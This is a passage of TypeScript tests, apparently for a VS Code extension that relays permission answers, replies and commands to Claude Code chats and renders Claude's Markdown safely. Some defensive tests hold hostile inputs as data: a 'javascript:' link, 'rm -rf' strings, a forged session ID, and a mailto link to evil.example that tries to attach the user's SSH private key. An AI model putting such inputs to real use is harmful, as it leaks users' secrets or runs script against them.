// The chat tab and what rows and notifications do with it: a click on a
// chat opens its tab; answers and replies go to pane.py with what the
// extension's own state says (the chat's request, its process), never with
// what the page claims; to-review and the tests badge; Claude's Markdown made
// into elements only (no link that runs anything).

import assert from "node:assert/strict";
import { mock, test } from "node:test";
import * as vscode from "vscode";
import { ChatPanes } from "../src/chatPane";
import { demoState } from "../src/shared/demo";
import { chatRefOf, clockText } from "../src/shared/model";
import { answerFor, answerKind, answersOf, answersTaken, answerText, askedShows, chatWhere, chipsAfterSend, chipsOf, chipsWanted, CHIPS_IGNORED, CHIPS_REST_MS, commandHint, commandRun, completionOf, suggestFor, type Offers, joinAnswer, clipboardCode, HOLD_MS, numberedPictures, oneChoice, pendingTaken, picturesIn, promptHistory, queuedReply, replyAnswers, replyKey, reviewPending, reviewSeen, routeHint, shownAsk, stampFresher, stopOf, testsText, contextText, contextHint, turnText, turnHint, turnTickIn, copyText, copyCut, lastReply, dayBreaks, dayLabel, newBelow, newHint, newText, timeText, textScale, TEXT_SCALES, whereTag, withoutPicture, type Asks, type UsualReplies } from "../src/shared/pane";
import type { ViewState } from "../src/shared/types";
import { ViewHost } from "../src/view";
import { clipboardWrites, overrides, recorded } from "./vscode-stub";
import { inline, Markdown } from "../webview/util/markdown";
import { ESC_ORDER, escTarget, KEY_GROUPS, KEYS, keyText, withKey } from "../vendor/keys.mjs";

const NOW = 1_800_000_000_000;

function waitingState(answer: "hook" | "keys" | ""): ViewState {
  const state = demoState(NOW);
  const s = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  s.permission = { tool: "Bash", line: "Bash: git tag v2.0.0", command: "git tag v2.0.0", file: "", diff: [], always: "Bash(git tag:*)",
                   request: answer === "hook" ? "1792957203525-37d298fb" : null, answer };
  return state;
}

// (without the --config-dir of the folders this test runs with)
const own = (args: string[]) => (args.includes("--config-dir") ? args.slice(0, args.indexOf("--config-dir")) : args);

function panes(state: ViewState, answers: Record<string, unknown> = {}) {
  const calls: string[][] = [];
  const backend = { pane: async (args: string[]) => (calls.push(own(args)), { ok: true, message: "Allowed", ...answers }) };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, setActionError() {}, setActionInfo() {} };
  const opened: unknown[] = [];
  const actions = { open: async (c: unknown) => void opened.push(c), unqueue: async () => undefined };
  const terminals = { find: async () => undefined };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, actions as never, terminals as never, {} as never);
  return { p, calls, opened };
}

test("an answer goes to the hook's request the state names, else to the chat's keys in tmux", async () => {
  const state = waitingState("hook");
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  const { p, calls } = panes(state);
  assert.deepEqual(await p.answer(chatRefOf(row), "deny", shownAsk(row.permission), " use make "), { ok: true, message: "Allowed" });
  assert.deepEqual(calls[0], ["--answer", "1792957203525-37d298fb", "--decision", "deny", "--note", "use make"]);

  const keys = waitingState("keys");
  const row2 = keys.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  const two = panes(keys);
  await two.p.answer(chatRefOf(row2), "always", shownAsk(row2.permission));
  assert.deepEqual(two.calls[0], ["--keys", row2.sessionId, "--profile", row2.profileDir, "--decision", "always"]);
});

test("a question's answers go to the hook's request as JSON; none chosen, nothing goes", async () => {
  const state = waitingState("hook");
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  row.permission!.questions = [{ question: "Which crust?", header: "Crust", multiSelect: false, options: [{ label: "Thin", description: "" }] }];
  const { p, calls } = panes(state);
  await p.answer(chatRefOf(row), "answer", shownAsk(row.permission), "", { "Which crust?": ["Thin"] });
  assert.deepEqual(calls[0], ["--answer", "1792957203525-37d298fb", "--decision", "answer", "--answers", '{"Which crust?":["Thin"]}']);
  assert.equal((await p.answer(chatRefOf(row), "answer", shownAsk(row.permission), "", {})).ok, false);
  assert.equal(calls.length, 1);
});

test("answers a page sends: {question: [strings]}, not too many", () => {
  assert.deepEqual(answersOf({ Q: ["a", "b"] }), { Q: ["a", "b"] });
  for (const bad of [null, [], "x", {}, { Q: "a" }, { Q: [1] }, Object.fromEntries(Array.from({ length: 17 }, (_, i) => [`q${i}`, ["a"]]))])
    assert.equal(answersOf(bad), null);
  const ask = { tool: "AskUserQuestion", line: "", command: "", file: "", diff: [], always: "", request: "r", answer: "hook" as const };
  const q = (multiSelect: boolean, n: number) => ({ question: "Q", header: "", multiSelect, options: Array.from({ length: n }, (_, i) => ({ label: `o${i}`, description: "" })) });
  assert.equal(oneChoice({ ...ask, questions: [q(false, 5)] }).length, 4);
  assert.deepEqual(oneChoice({ ...ask, questions: [q(true, 2)] }), []);
  assert.deepEqual(oneChoice({ ...ask, questions: [q(false, 2), q(false, 2)] }), []);
  assert.deepEqual(oneChoice(null), []);
});

test("nothing is answered for a chat that doesn't ask, or that only its own dialog can answer", async () => {
  const state = waitingState("");
  const rows = state.status!.groups.flatMap((g) => g.sessions);
  const { p, calls } = panes(state);
  const waiting = rows.find((x) => x.state === "waiting")!;
  assert.equal((await p.answer(chatRefOf(waiting), "allow", shownAsk(waiting.permission))).ok, false);
  assert.equal((await p.answer(chatRefOf(rows.find((x) => x.state !== "waiting")!), "allow", shownAsk(waiting.permission))).ok, false);
  assert.deepEqual(calls, []);
});

// One command-line argument holds 128 KiB at most: a long reply (60,000
// characters of Japanese is 180 KB) goes in a file of its own, private to
// you, which is gone after; one over 100,000 characters isn't sent
test("a long reply goes to pane.py in a file of its own, removed after", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-text-"));
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions)[0];
  const seen: [string, number, string][] = [];
  const backend = {
    pane: async (args: string[]) => {
      const file = args[args.indexOf("--text-file") + 1];
      seen.push([args.includes("--text") ? "text" : "file", fs.statSync(file).mode & 0o777, fs.readFileSync(file, "utf8")]);
      return { ok: true, message: "Sent" };
    },
  };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, setActionError() {}, setActionInfo() {} };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  const long = "語".repeat(60000);
  assert.equal((await p.send(chatRefOf(row), long, "auto", false)).ok, true);
  assert.deepEqual(seen, [["file", 0o600, long]]);
  assert.deepEqual(fs.readdirSync(path.join(process.env.XDG_CACHE_HOME, "talpy-den")).filter((f) => f.startsWith("text-")), [], "gone after");
  assert.deepEqual(await p.send(chatRefOf(row), "a".repeat(100001), "auto", false), { ok: false, message: "That message is too long" });
});

test("a reply goes to pane.py --send; copy goes to the clipboard and opens the chat; a Claude Code panel gets its link", async () => {
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions)[0];
  const { p, calls, opened } = panes(state);
  assert.equal((await p.send(chatRefOf(row), "  and the docs  ", "auto", false)).ok, true);
  assert.deepEqual(calls[0].slice(0, 6), ["--send", row.chatId, "--text", "and the docs", "--how", "auto"]);
  assert.ok(calls[0].includes("--session"));
  await p.send(chatRefOf(row), "later on", "background", true);
  assert.deepEqual(calls[1].slice(calls[1].indexOf("--after-turn"), calls[1].indexOf("--after-turn") + 3), ["--after-turn", "--name", row.name]);
  await p.send(chatRefOf(row), "copy me", "copy", false);
  assert.equal(clipboardWrites.at(-1), "copy me");
  assert.equal(opened.length, 1);
  assert.equal(calls.length, 2);
  assert.equal((await p.send(chatRefOf(row), "   ", "auto", false)).ok, false);
  const ask = panes(state, { how: "ask" });
  assert.equal((await ask.p.send(chatRefOf(row), "hi", "auto", false)).ask, true);
  // Enter: a terminal that takes no text gets the copy (Claude there doesn't quit), asked of pane.py as auto
  const entered = await ask.p.send(chatRefOf(row), " and the tests ", "enter", false);
  assert.deepEqual(entered, { ok: true, message: "Its terminal takes no text from outside, so your message is in the clipboard: paste it there" });
  assert.deepEqual(ask.calls[1].slice(0, 6), ["--send", row.chatId, "--text", "and the tests", "--how", "auto"]);
  assert.equal(clipboardWrites.at(-1), "and the tests");
  assert.equal(ask.opened.length, 1);
  const typed = panes(state, { how: "typed", message: "Sent" });
  assert.deepEqual(await typed.p.send(chatRefOf(row), "hi", "enter", false), { ok: true, message: "Sent", went: true });
  assert.equal(typed.opened.length, 0);
});

// The / list's offers as pane.py --complete gives them (commands.py's kinds), a few of them
const OFFERS: Offers = {
  commands: [
    { name: "/compact", about: "Free up context", kind: "Claude", run: "here" },
    { name: "/config", about: "Open settings", kind: "Claude", run: "terminal", why: "opens Claude's settings panel" },
    { name: "/export", about: "Export the conversation", kind: "Claude", run: "terminal", runArgs: "here", why: "asks where to" },
    { name: "/model", about: "Set the model", kind: "Claude", run: "terminal", why: "saves it as your default model for every new chat" },
    { name: "/permissions", about: "What Claude may do without asking", kind: "Claude", run: "page" },
    { name: "/ship", about: "Ship it", kind: "yours", run: "here" },
  ],
  files: [],
  history: [],
  typed: { settings: { run: "terminal", of: "/config", why: "opens Claude's settings panel" }, theme: { run: "terminal", why: "uses Claude's own screen" } },
};

test("a command runs as its kind says on the chat's route (Plasma's commandRun: the same rule and words)", () => {
  const tmux = { where: "tmux" as const, route: "tmux" as const };
  const closed = { where: "closed" as const, route: "background" as const };
  assert.equal(commandRun("tidy it", OFFERS, tmux), null);
  assert.equal(commandRun("/nope", OFFERS, tmux), null);   // (not known: sent as typed)
  assert.equal(commandRun("/compact", null, tmux), null);   // (the kinds not read yet: the tab waits for them before sending;
  assert.deepEqual(commandRun("/model fable", null, tmux), { run: "terminal", name: "/model", why: "needs Claude's own screen" });   // couldn't be: never /model)
  assert.deepEqual(commandRun("/compact keep the tests", OFFERS, closed), { run: "here", name: "/compact", why: "" });
  assert.deepEqual(commandRun(" /config ", OFFERS, tmux), { run: "terminal", name: "/config", why: "opens Claude's settings panel" });
  assert.deepEqual(commandRun("/settings", OFFERS, tmux), { run: "terminal", name: "/config", why: "opens Claude's settings panel" });
  // /model never goes from here (it saves your default for every new chat), with or without a name
  assert.equal(commandRun("/model fable", OFFERS, closed)!.run, "terminal");
  assert.equal(commandRun("/export", OFFERS, tmux)!.run, "terminal");
  assert.equal(commandRun("/export chat.md", OFFERS, tmux)!.run, "here");
  assert.equal(commandRun("/permissions", OFFERS, tmux)!.run, "page");
  // in a Claude Code panel it goes into the panel's input (you press Enter in Claude's own); a new chat can't open a terminal yet
  assert.equal(commandRun("/config", OFFERS, { where: "claude", route: "vscode" })!.run, "here");
  assert.deepEqual(commandRun("/config", OFFERS, { where: "new", route: "background" }),
                   { run: "off", name: "/config", why: "/config opens Claude's settings panel: start the chat first, then it opens in its terminal." });
  // a shell command: in Claude's prompt only
  assert.deepEqual(commandRun("!ls", OFFERS, tmux), { run: "here", name: "!", why: "" });
  assert.equal(commandRun("!ls", null, { where: "background", route: "background" })!.run, "here");
  assert.equal(commandRun("!ls", OFFERS, { where: "terminal", route: "terminal" })!.run, "terminal");
  assert.deepEqual(commandRun("!ls", OFFERS, closed), { run: "off", name: "!", why: "A chat that isn't running reads ! as a message, not as a shell command: open it in its terminal to run it there." });
  assert.equal(commandRun("!ls", OFFERS, { where: "new", route: "background" })!.why,
               "A new chat starts in the background, where Claude reads ! as a message: start it first, then run the command in its terminal.");
  assert.equal(commandRun("!!", OFFERS, closed), null);
  // the line under the box
  assert.equal(commandHint(commandRun("/config", OFFERS, tmux), "tmux"), "/config opens Claude's settings panel: Enter types it into its tmux pane, for you to press Enter there.");
  assert.equal(commandHint(commandRun("/config", OFFERS, closed), "background", "gpu"),
               "/config opens Claude's settings panel: Enter opens the chat's terminal, with the command on the clipboard to paste there. (on gpu)");
  assert.equal(commandHint(commandRun("/permissions", OFFERS, tmux), "tmux"), "Enter opens Talpy Den's Permissions tab: what Claude may do without asking, in every chat.");
  assert.equal(commandHint(commandRun("/compact", OFFERS, tmux), "tmux"), null);
  assert.equal(commandHint(null, "tmux"), null);
  // the / list: where each runs, greyed with why where it can't
  const list = suggestFor("/", OFFERS, "", { where: "new", route: "background" }).items;
  assert.deepEqual(list.map((o) => [o.text, o.tag ?? "", !!o.off]),
                   [["/compact", "", false], ["/config", "", true], ["/export", "", true], ["/model", "", true], ["/permissions", "Talpy Den", false], ["/ship", "", false]]);
  assert.equal(list[1].about, "/config opens Claude's settings panel: start the chat first, then it opens in its terminal.");
  assert.equal(list[5].about, "Ship it · yours");
  assert.deepEqual(suggestFor("/co", OFFERS, "", tmux).items.map((o) => [o.text, o.tag]), [["/compact", ""], ["/config", "Terminal"]]);
});

test("a command for Claude's own panel goes to its terminal, never sent: typed into this window's, else pane.py --type-in", async () => {
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions)[0];
  const { p, calls, opened } = panes(state, { how: "copy", copied: false, text: "/config", message: "Paste it into its terminal" });
  assert.deepEqual(await p.typeIn(chatRefOf(row), "/config"), { ok: true, message: "It's in the clipboard. Paste it into its terminal" });
  assert.deepEqual(calls[0].slice(0, 5), ["--type-in", row.chatId, "--text", "/config", "--no-copy"]);
  assert.equal(clipboardWrites.at(-1), "/config");   // (VS Code's clipboard)
  assert.equal(opened.length, 1);
  const typed = panes(state, { how: "typed", message: "It's typed into its terminal: press Enter there" });
  assert.deepEqual(await typed.p.typeIn(chatRefOf(row), "/config"), { ok: true, message: "It's typed into its terminal: press Enter there" });
  assert.equal(typed.opened.length, 1);
  assert.equal(calls.some((c) => c[0] === "--send"), false);
});

test("a shell command you sent is found in Claude's queue without its !", () => {
  const pending = [{ id: 1, text: "!ls src", at: NOW, state: "sent" as const, sentAt: NOW, known: [] }];
  assert.deepEqual([...pendingTaken([{ kind: "you", key: "queued-1", text: "ls src", at: NOW }], pending, NOW + 100, true)], [1]);
  assert.deepEqual([...pendingTaken([{ kind: "you", key: "x", text: "!ls src", at: NOW, command: { shell: true } }], pending, NOW + 100, true)], [1]);
});

test("a click on a chat opens its tab, unless clicks open the chat itself; answers use the extension's chat", () => {
  const state = waitingState("hook");
  const calls: { name: string; args: unknown[] }[] = [];
  const record = (name: string) => (...args: unknown[]) => void calls.push({ name, args });
  const actions = new Proxy({}, { get: (_t, name: string) => (name === "demoOnly" ? () => false : record(name)) });
  const dash = { opened() {}, onState: () => ({ dispose() {} }), onPetEvent: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false, state: () => state, setVisible() {}, moreChat: () => null };
  const host = new ViewHost(vscode.Uri.file("/ext") as never, dash as never, actions as never);
  host.panes = { open: record("panes.open"), answer: record("panes.answer") } as never;
  const receive = (m: unknown) => (host as unknown as { receive(w: unknown, m: unknown): void }).receive({ postMessage: async () => true }, m);
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  receive({ type: "open", chat: { key: row.key, sessionId: "forged", profileDir: "x", name: "x" } });
  assert.equal(calls[0].name, "panes.open");
  assert.equal((calls[0].args[0] as { sessionId: string }).sessionId, row.sessionId); // (the state's chat, not the page's)
  overrides.set("clickOpensPane", false);
  try {
    receive({ type: "open", chat: { key: row.key } });
    assert.equal(calls[1].name, "open");
  } finally {
    overrides.delete("clickOpensPane");
  }
  receive({ type: "answerPermission", chat: { key: row.key }, decision: "always", note: "", shown: shownAsk(row.permission) });
  assert.equal(calls[2].name, "panes.answer");
  assert.equal(calls[2].args[1], "always");
  assert.deepEqual(calls[2].args[2], shownAsk(row.permission)); // (the prompt the row showed goes with it)
  receive({ type: "answerPermission", chat: { key: row.key }, decision: "rm -rf", note: "" });
  receive({ type: "openPane", chat: { key: "not-a-row" } });
  assert.equal(calls.length, 3);
});

test("to review: finished, changed files after the first look, not marked since (0: marked not reviewed)", () => {
  const status = { ...demoState(NOW).status!, reviewed: { a: NOW, "gpu|b": NOW, c: 0 }, reviewedSince: NOW - 10_000 };
  const item = (id: string, editedAt: number, state: "done" | "working" = "done") =>
    ({ sessionId: id, chatId: id, state, review: { editedAt, tests: null } });
  assert.equal(reviewPending(item("x", NOW - 5_000), status), true);
  assert.equal(reviewPending(item("x", NOW - 20_000), status), false); // (before the first look)
  assert.equal(reviewPending(item("x", NOW - 5_000, "working"), status), false);
  assert.equal(reviewPending(item("a", NOW - 1), status), false);
  assert.equal(reviewPending(item("a", NOW + 1), status), true); // (changed files again)
  assert.equal(reviewPending(item("b", NOW - 1), status, "gpu"), false);
  assert.equal(reviewPending(item("c", NOW - 20_000), status), true);
  assert.equal(reviewPending({ sessionId: "y", review: null }, status), false);
  // the chat tab's Reviewed ✓: the mark itself, also while it works
  assert.equal(reviewSeen(item("a", NOW - 1, "working"), status), true);
  assert.equal(reviewSeen(item("x", NOW - 5_000, "working"), status), false);
  assert.equal(reviewSeen(item("c", NOW - 20_000, "working"), status), false);
});

test("a chat waiting for a permission is told with its question, once more when the hook's request comes a poll late", async () => {
  const { TransitionTracker } = await import("../src/transitions");
  const t = new TransitionTracker();
  const opts = { notifyWaiting: true, notifyDone: true, notifyDoneMinSeconds: 0 };
  const g = demoState(NOW).status!.groups[0];
  const row = (state: "working" | "waiting", permission: unknown) => [{ ...g, sessions: [{ ...g.sessions[0], key: "k", chatId: "k", sessionId: "k", name: "k", state, permission } as never] }];
  t.track("", row("working", null), NOW, undefined, opts);
  const first = t.track("", row("waiting", null), NOW + 2000, undefined, opts);
  assert.deepEqual(first.notices.map((n) => n.title), ["k needs your input"]);
  const ask = { tool: "Bash", line: "Bash: make", command: "make deploy", file: "", diff: [], always: "", request: "1-a", answer: "hook" };
  const late = t.track("", row("waiting", ask), NOW + 4000, undefined, opts);
  assert.deepEqual(late.notices.map((n) => [n.title, n.body.split(" · ")[0]]), [["k asks for a permission", "make deploy"]]);
  assert.deepEqual(t.track("", row("waiting", ask), NOW + 6000, undefined, opts).notices, []); // (told once)
  // Claude's questions: "asks you", each question
  const t2 = new TransitionTracker();
  const question = { ...ask, tool: "AskUserQuestion", command: "", questions: [
    { question: "Which crust?", header: "", multiSelect: false, options: [] }, { question: "Which toppings?", header: "", multiSelect: true, options: [] }] };
  t2.track("", row("working", null), NOW, undefined, opts);
  const asked = t2.track("", row("waiting", question), NOW + 2000, undefined, opts);
  assert.deepEqual(asked.notices.map((n) => [n.title, n.body.split(" · ")[0]]), [["k asks you", "Which crust? Which toppings?"]]);
});

test("the tests badge, a queued reply and how a reply goes", () => {
  assert.equal(testsText({ editedAt: 1, tests: null })!.text, "Not tested");
  assert.deepEqual(testsText({ editedAt: 1, tests: { command: "npm test", ok: true, at: 2 } }), { text: "Tests", ok: true, title: "Tests passed after its last edit: npm test" });
  assert.equal(testsText({ editedAt: 1, tests: { command: "npm test", ok: false, at: 2 } })!.ok, false);
  assert.equal(testsText(null), null);
  const status = { ...demoState(NOW).status!, queue: [{ id: "q1", afterTurn: true, chat: "c1", host: "" } as never] };
  assert.equal(queuedReply(status, "c1")?.id, "q1");
  assert.equal(queuedReply(status, "c1", "gpu"), null);
  assert.match(routeHint("terminal", true, "interactive", ""), /takes no text from outside/);
  assert.match(routeHint("tmux", true, "interactive", "gpu"), /tmux pane\. \(on gpu\)/);
});

test("the tag under a chat's name says where it runs", () => {
  const s = { pid: 7, kind: "interactive", entrypoint: "cli", tmux: false, vscodeTerminal: null };
  assert.equal(chatWhere(undefined, false), "closed");
  assert.equal(chatWhere({ ...s, pid: null }, false), "closed");
  assert.equal(chatWhere({ ...s, kind: "bg" }, false), "background");
  assert.equal(chatWhere({ ...s, entrypoint: "claude-vscode" }, false), "claude");
  assert.equal(chatWhere({ ...s, tmux: true, vscodeTerminal: 41 }, false), "tmux");    // (tmux in a VS Code terminal)
  assert.equal(chatWhere({ ...s, vscodeTerminal: 41 }, false), "vscode");
  assert.equal(chatWhere(s, true), "vscode");                                          // (one of this window's terminals)
  assert.equal(chatWhere(s, false), "terminal");
  assert.equal(whereTag("claude").tag, "Claude Code panel");
  assert.equal(whereTag("terminal", "Konsole").title, "It runs in a terminal (Konsole).");
});

test("Stop on the working line: where Talpy Chat reaches a chat at work (Plasma's rule), else where to stop it", async () => {
  const chat = { state: "working" as const, atWork: true, where: "background" as const, route: "background" as const, bgStop: true };
  const none = { can: false, title: "", elsewhere: "" };
  assert.match(stopOf(chat).title, /as Esc in its terminal: the background chat stays/);
  assert.equal(stopOf({ ...chat, where: "tmux", route: "tmux", bgStop: false }).can, true);
  assert.equal(stopOf({ ...chat, where: "vscode", route: "vscodeTerminal", bgStop: false }).can, true);   // (one of this window's terminals)
  // (a background chat of a Claude Code version Stop wasn't checked on, a terminal it can't type into, a Claude Code panel)
  assert.match(stopOf({ ...chat, bgStop: false }).elsewhere, /^To stop it: open it in a terminal and press Esc there\./);
  assert.match(stopOf({ ...chat, where: "terminal", route: "terminal" }).elsewhere, /press Esc in its terminal/);
  assert.match(stopOf({ ...chat, where: "vscode", route: "terminal" }).elsewhere, /press Esc in its terminal/);
  assert.match(stopOf({ ...chat, where: "claude", route: "vscode" }).elsewhere, /stop button in its Claude Code panel/);
  assert.equal(stopOf({ ...chat, bgStop: false }).can, false);
  // only while Claude works on its turn (not a background command after it, nor a question)
  assert.deepEqual(stopOf({ ...chat, atWork: false }), none);
  assert.deepEqual(stopOf({ ...chat, state: "waiting" }), none);
  assert.deepEqual(stopOf(null), none);

  // pane.py --interrupt for the session that has it open; in one of this window's terminals, Ctrl+C typed in
  const state = demoState(NOW);
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "working")!;
  row.chatId = row.sessionId;
  const { p, calls } = panes(state);
  assert.deepEqual(await p.interrupt(chatRefOf(row)), { ok: true, message: "Allowed" });
  assert.deepEqual(calls, [["--interrupt", row.sessionId, ...(row.profileDir ? ["--profile", row.profileDir] : [])]]);
  const typed: string[] = [];
  Object.assign(row, { kind: "interactive", tmux: false, entrypoint: "cli", pid: 4242 });
  const here = new ChatPanes(vscode.Uri.file("/ext") as never, { pane: async () => assert.fail("not pane.py") } as never,
    { state: () => state, refresh: async () => undefined, pollHost: async () => undefined } as never, {} as never,
    { find: async () => ({ sendText: (t: string) => typed.push(t) }) } as never, {} as never);
  assert.deepEqual(await here.interrupt(chatRefOf(row)), { ok: true, message: "Interrupted (Ctrl+C in its terminal)" });
  assert.deepEqual(typed, ["\x03"]);
  row.state = "idle";
  assert.equal((await p.interrupt(chatRefOf(row))).ok, false);
});

test("every file a page loads from dist/ is packaged (.vscodeignore names each one)", async () => {
  const fs = await import("node:fs");
  const shipped = fs.readFileSync(".vscodeignore", "utf8").split("\n").filter((l) => l.startsWith("!dist/")).map((l) => l.slice(6).trim());
  const loaded = new Set<string>();
  for (const f of fs.readdirSync("src").filter((n) => n.endsWith(".ts")))
    for (const m of fs.readFileSync(`src/${f}`, "utf8").matchAll(/asset\("dist", "([^"]+)"\)/g)) loaded.add(m[1]);
  assert.ok(loaded.has("chat.js") && loaded.has("webview.js"), [...loaded].join(", "));
  for (const name of loaded) assert.ok(shipped.includes(name), `${name} isn't in .vscodeignore`);
});

test("Claude's Markdown: links only to the web or mail; the rest stays text", () => {
  const out = inline("see **[the docs](https://example.org/x)** and [this](javascript:alert(1)) and `rm -rf /`");
  const flat = (nodes: unknown[]): { type: unknown; href?: string }[] =>
    nodes.flatMap((n) => {
      if (!n || typeof n !== "object") return [];
      const v = n as { type: unknown; props: { href?: string; children?: unknown } };
      const kids = Array.isArray(v.props.children) ? v.props.children : [v.props.children];
      return [{ type: v.type, href: v.props.href }, ...flat(kids)];
    });
  const nodes = flat(out);
  assert.deepEqual(nodes.filter((n) => n.type === "a").map((n) => n.href), ["https://example.org/x"]);
  assert.ok(nodes.some((n) => n.type === "span")); // (the javascript: link, as text)
  assert.ok(nodes.some((n) => n.type === "code"));
  assert.ok(nodes.some((n) => n.type === "strong"));
});

test("Claude's Markdown: a link's address keeps its parentheses (a Wikipedia page)", () => {
  const out = inline("[C](https://en.wikipedia.org/wiki/C_(programming_language)) and [x](https://a.b/c).") as unknown[];
  const links = out.filter((n) => n && typeof n === "object" && (n as { type: unknown }).type === "a")
    .map((n) => (n as { props: { href: string } }).props.href);
  assert.deepEqual(links, ["https://en.wikipedia.org/wiki/C_(programming_language)", "https://a.b/c"]);
  assert.deepEqual(out.filter((n) => typeof n === "string"), [" and ", "."]);
});
// A mail link goes to its addresses only: ?attach= would put a file of yours in the mail
test("a mail link keeps no query", () => {
  const out = inline("[m](mailto:a@evil.example?attach=/home/you/.ssh/id_ed25519&body=x)") as { props: { href: string; title: string } }[];
  assert.deepEqual([out[0].props.href, out[0].props.title], ["mailto:a@evil.example", "mailto:a@evil.example"]);
});


test("the chat tab's text size: a number in range, else the default", () => {
  assert.equal(textScale(1.5), 1.5);
  assert.equal(textScale(9), 2);
  assert.equal(textScale(0.1), 0.8);
  assert.equal(textScale("big"), 1.15);
  assert.equal(textScale(Number.NaN), 1.15);
  assert.ok(TEXT_SCALES.includes(1.15));
});

test("Claude's Markdown: ~~struck~~ text, and a code block keeps its text for Copy", () => {
  const nodes = inline("was ~~52~~ now `weeksInYear`") as { type?: unknown }[];
  assert.ok(nodes.some((n) => n && typeof n === "object" && n.type === "s"));
  const copied: string[] = [];
  const tree = Markdown({ text: "```ts\nif (a < b) return 1;\n```", onCopy: (code) => copied.push(code) }) as {
    props: { children: { props: { children: { props: { children: { props: { onClick?: () => void } }[] } }[] } }[] };
  };
  const block = tree.props.children[0];
  const copy = block.props.children[0].props.children[1];
  copy.props.onClick?.();
  assert.deepEqual(copied, ["if (a < b) return 1;"]);
});

test("a code block's Copy leaves out the ! of a command for Claude's prompt, each line's; else it's as written", () => {
  assert.equal(clipboardCode("! chmod 644 scripts/x.py"), "chmod 644 scripts/x.py");
  assert.equal(clipboardCode("! git add a\n\n!  git commit"), "git add a\n\ngit commit");
  for (const code of ["if ! grep -q x f; then echo no; fi", "! git add a\ngit commit", "!pip install x", "!", "", "a != b"])
    assert.equal(clipboardCode(code), code);
});

test("Show earlier goes up to the most a tab shows, then the tab says only the last steps are shown", async () => {
  const row = demoState(NOW).status!.groups.flatMap((g) => g.sessions)[0];
  const limits: string[] = [];
  // (the watcher, --wait, finds nothing new)
  const backend = { pane: async (args: string[]) => (args.includes("--wait") ? { ok: true, unchanged: true }
    : (limits.push(args[args.indexOf("--limit") + 1]), { ok: true, items: [], more: true, stamp: `s${limits.length}` })) };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                          { find: async () => undefined } as never, {} as never);
  const tick = () => new Promise((r) => setTimeout(r, 10));
  p.open(chatRefOf(row));
  const panel = recorded.panels.at(-1)!;
  panel.show(true);
  panel.receive({ type: "ready" });
  await tick();
  for (let i = 0; i < 6; i++) {
    panel.receive({ type: "more" });
    await tick();
  }
  panel.dispose();
  const answers = panel.sent.filter((m) => (m as { type: string }).type === "conversation").map((m) => (m as { answer: { more?: boolean; capped?: boolean } }).answer);
  assert.deepEqual(limits, ["120", "240", "480", "960", "1920", "2000", "2000"]);
  assert.deepEqual([answers[0].more, answers[0].capped], [true, false]);
  assert.deepEqual([answers.at(-1)!.more, answers.at(-1)!.capped], [false, true]);
});

// A Markdown() tree as HTML (tags, their plain props and the text), to compare
const asHtml = (n: unknown): string => {
  if (n === null || n === undefined || typeof n === "boolean") return "";
  if (Array.isArray(n)) return n.map(asHtml).join("");
  if (typeof n !== "object") return String(n);
  const { type, props } = n as { type: string; props: Record<string, unknown> };
  const attrs = Object.entries(props)
    .filter(([k, v]) => k !== "children" && (typeof v === "string" || typeof v === "number"))
    .map(([k, v]) => ` ${k}="${v}"`)
    .join("");
  return `<${type}${attrs}>${asHtml(props.children)}</${type}>`;
};
const md = (text: string) => asHtml(Markdown({ text })).replace(/^<div class="md">|<\/div>$/g, "");

test("Claude's Markdown: a numbered list with bullets under a step, as the Plasma pane shows it", () => {
  assert.equal(
    md("1. Step one\n   - detail a\n   - detail b\n2. Step two"),
    '<ol start="1"><li>Step one<ul><li>detail a</li><li>detail b</li></ul></li><li>Step two</li></ol>',
  );
  assert.equal(md("- a\n  1. x\n  2. y\n- b"), '<ul><li>a<ol start="1"><li>x</li><li>y</li></ol></li><li>b</li></ul>');
});

test("Claude's Markdown: bare web addresses, \\| in a table, globs and *args, a code block in a step", () => {
  assert.equal(md("see https://example.com/x."), '<p>see <a href="https://example.com/x" title="https://example.com/x">https://example.com/x</a>.</p>');
  const table = md("| cmd | what |\n|---|---|\n| `a \\| b` | pipe \\| x |");
  assert.ok(table.includes("<td><code>a | b</code></td><td>pipe | x</td></tr>"), table);
  assert.equal(md("text with \\*escaped\\* stars"), "<p>text with *escaped* stars</p>");
  for (const text of ["Look at the *.py and *.js files", "Use **kwargs and *args in f(*args, **kwargs)", "foo__bar__baz"])
    assert.equal(md(text), `<p>${text}</p>`);
  assert.equal(md("**Note:** a *b* and __c__, a*b*c"), "<p><strong>Note:</strong> a <em>b</em> and <strong>c</strong>, a<em>b</em>c</p>");
  // (a one-character bold before another on the line ends at its own marks; a bold never runs over another's)
  assert.equal(md("with **Edit**, **✕** and **Send now**."), "<p>with <strong>Edit</strong>, <strong>✕</strong> and <strong>Send now</strong>.</p>");
  assert.equal(md("f(*args, **kw) and **bold**"), "<p>f(*args, **kw) and <strong>bold</strong></p>");
  const copied: string[] = [];
  const tree = Markdown({ text: "1. Run:\n   ```python\n   if x:\n       go()\n   ```", onCopy: (code) => copied.push(code) });
  // (in its language's colors, as a tool's listing; its text as it was, for Copy)
